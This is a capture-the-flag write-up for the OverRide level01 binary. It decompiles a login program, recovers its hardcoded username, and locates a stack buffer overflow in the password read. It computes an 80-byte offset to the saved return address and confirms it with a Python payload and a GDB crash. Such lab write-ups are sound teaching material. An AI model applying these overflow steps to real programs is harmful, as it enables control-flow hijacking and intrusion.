# level01

For this level, I start the same way as level00: extract the binary and inspect
it in Binary Ninja.

## What Binary Ninja does here

Binary Ninja reads the compiled ELF binary and rebuilds readable pseudo-C from
the assembly. This makes it easier to identify functions, calls, local
variables, string references, branches, and the general program flow.

## Get the binary

From the host machine, copy the `level01` binary from the VM:

```sh
scp -P <port> level01@<host>:/home/users/level01/level01 ./level01/level01
```

The local binary for analysis should be:

```text
level01/level01
```

Open this file in [Binary Ninja](https://cloud.binary.ninja/).

## Start the analysis

In Binary Ninja:

1. Open `level01`.
2. Wait for analysis to finish.
3. Look at the symbol list.
4. Find `main`.
5. Use the decompiler view or Linear Disassembly.

## What `main` shows

Binary Ninja gives this high-level structure:

```c
int32_t main(int32_t argc, char** argv, char** envp)
{
    void buf;

    __builtin_memset(&buf, 0, 0x40);
    int32_t var_14 = 0;

    puts("********* ADMIN LOGIN PROMPT *********");
    printf("Enter Username: ");
    fgets(&a_user_name, 0x100, stdin);

    if (verify_user_name())
    {
        puts("nope, incorrect username...\n");
        return 1;
    }

    puts("Enter Password: ");
    fgets(&buf, 0x64, stdin);

    int32_t eax_2 = verify_user_pass(&buf);

    if (eax_2 && !eax_2)
        return 0;

    puts("nope, incorrect password...\n");
    return 1;
}
```

The important points for now:

- `main` reads a username into the global `a_user_name`.
- It calls `verify_user_name()`.
- If the username check fails, the program exits.
- Then it reads a password into a local buffer.
- It calls `verify_user_pass(&buf)`.

So the next functions to inspect in Binary Ninja are:

```text
verify_user_name
verify_user_pass
```

## `verify_user_name`

Binary Ninja shows that this function compares the global username buffer with
the string `dat_wil`.

Relevant decompiled structure:

```c
int32_t verify_user_name()
{
    puts("verifying username....\n");

    int32_t i = 7;
    char* esi = &a_user_name;
    char* edi = "dat_wil";

    while (i)
    {
        char temp1 = *esi;
        char temp2 = *edi;

        esi = &esi[1];
        edi = &edi[1];
        i -= 1;

        if (temp1 != temp2)
            break;
    }

    return /* strcmp-like result */;
}
```

Important point:

```text
username is compared with "dat_wil"
```

## `verify_user_pass`

Binary Ninja shows a similar comparison for the password. The function receives
the password buffer as `arg1` and compares it with the string `admin`.

Relevant decompiled structure:

```c
int32_t verify_user_pass(char* arg1)
{
    int32_t i = 5;
    char* esi = arg1;
    char* edi = "admin";

    while (i)
    {
        char temp1 = *esi;
        char temp2 = *edi;

        esi = &esi[1];
        edi = &edi[1];
        i -= 1;

        if (temp1 != temp2)
            break;
    }

    return /* strcmp-like result */;
}
```

Important point:

```text
password is compared with "admin"
```

## Current conclusion

At this stage, Binary Ninja shows these comparison strings:

```text
username: dat_wil
password: admin
```

Testing them:

```sh
level01@OverRide:~$ ./level01
********* ADMIN LOGIN PROMPT *********
Enter Username: dat_wil
verifying username....

Enter Password:
admin
nope, incorrect password...
```

So `dat_wil` is the correct username, but `admin` does not give access through
the normal password path.

The suspicious part is in `main`:

```c
int32_t eax_2 = verify_user_pass(&buf);

if (eax_2 && !eax_2)
    return 0;
```

This condition cannot be true: a value cannot be both non-zero and zero at the
same time. In practice, the program always reaches:

```c
puts("nope, incorrect password...\n");
return 1;
```

This means the next step is not to find a normal password. The next thing to
inspect is the password input buffer:

```c
void buf;
__builtin_memset(&buf, 0, 0x40);
fgets(&buf, 0x64, stdin);
```

`buf` is initialized as `0x40` bytes, but `fgets` can read `0x64` bytes. That
suggests the password input may overflow the local buffer.

## Finding what gets overwritten

The interesting part in the disassembly of `main` is:

```asm
push   ebp
mov    ebp,esp
push   edi
push   ebx
and    esp,0xfffffff0
sub    esp,0x60
lea    ebx,[esp+0x1c]
...
mov    DWORD PTR [esp+0x4],0x64
lea    eax,[esp+0x1c]
mov    DWORD PTR [esp],eax
call   fgets
...
lea    esp,[ebp-0x8]
pop    ebx
pop    edi
pop    ebp
ret
```

So the local password buffer starts at:

```text
esp + 0x1c
```

The function later restores registers and returns using saved stack values near
`ebp`:

```text
saved ebx  -> ebp - 0x8
saved edi  -> ebp - 0x4
saved ebp  -> ebp
saved eip  -> ebp + 0x4
```

Because `fgets(&buf, 0x64, stdin)` can write more than the `0x40` bytes reserved
for `buf`, the password input can overflow past the local buffer and reach the
saved return address.

For this binary, the useful overwrite offset is:

```text
80 bytes to reach saved EIP
```

So the password payload shape is:

```text
"A" * 80 + new_return_address
```

The username is stored globally at:

```asm
0804a040 g     O .bss   00000064 a_user_name
```

Since the username input is read before the password input:

```c
fgets(&a_user_name, 0x100, stdin);
```

we can place data in `a_user_name`, then use the password overflow to redirect
execution there.

## Confirm the EIP offset

First confirm that 80 bytes reaches saved EIP:

```sh
python -c 'print("dat_wil"); print("A" * 80 + "BBBB")' > /tmp/payload
gdb ./level01
```

Inside GDB:

```gdb
run < /tmp/payload
```

Expected crash:

```text
Program received signal SIGSEGV, Segmentation fault.
0x42424242 in ?? ()
```

`0x42` is `B`, so `0x42424242` confirms that `"BBBB"` overwrote EIP.

